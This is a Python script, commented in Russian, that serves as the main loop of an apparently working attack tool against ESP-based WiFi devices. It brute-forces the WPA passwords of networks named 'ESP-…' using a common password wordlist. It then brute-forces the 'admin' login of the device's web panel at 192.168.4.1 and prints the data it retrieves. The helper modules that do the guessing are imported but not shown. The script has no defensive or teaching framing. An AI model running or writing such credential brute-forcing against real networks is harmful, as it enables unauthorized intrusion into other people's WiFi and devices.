from bs4 import BeautifulSoup
import requests
from brute_force import brute_force_pass_site, brute_force_pass_wifi
from wifi_connect import verify_connected

# Параметры программы
site_ip = "192.168.4.1"
wifi_pattern = "ESP-"
passlist_name_wifi = "probable-v2-wpa-top62.txt"
passlist_name_site = "probable-v2-wpa-top62.txt"
default_sitelogin = "admin"

# Функция для вывода  содержимого страницы после получения доступа
def get_info_from_site(response) -> list[str]:
    soup = BeautifulSoup(response.text, 'html.parser')

    values = soup.find_all("div", attrs={"class": "value"})
    datas = []
    for value in values:
        datas.append(value.text.strip())
    return datas

def main():
    try:
        while True:
            # 1. Подбор пароля WiFi

            ssid = brute_force_pass_wifi(wifi_pattern, passlist_name_wifi)
            if not ssid:
                print("No wifi found, retrying...")
                continue
            session = None

            while verify_connected(ssid):
                print("Watting attack...")
                if not session:

                    # 2. Подбор пароля как сайту
                    session, password = brute_force_pass_site(site_ip, default_sitelogin, passlist_name_site)
                    if session is None:
                        continue
                try:
                    # 3. Выводим содержимое страницы при удачном подлкючении
                    response = session.post("http://192.168.4.1/check", data={'username': default_sitelogin, 'password': password})
                    print(response.text)

                except requests.RequestException as e:
                    print("The connection is interrupted, is connecting...")
                    session = None
    except KeyboardInterrupt:
        print("Exiting...")


if __name__ == '__main__':
    main()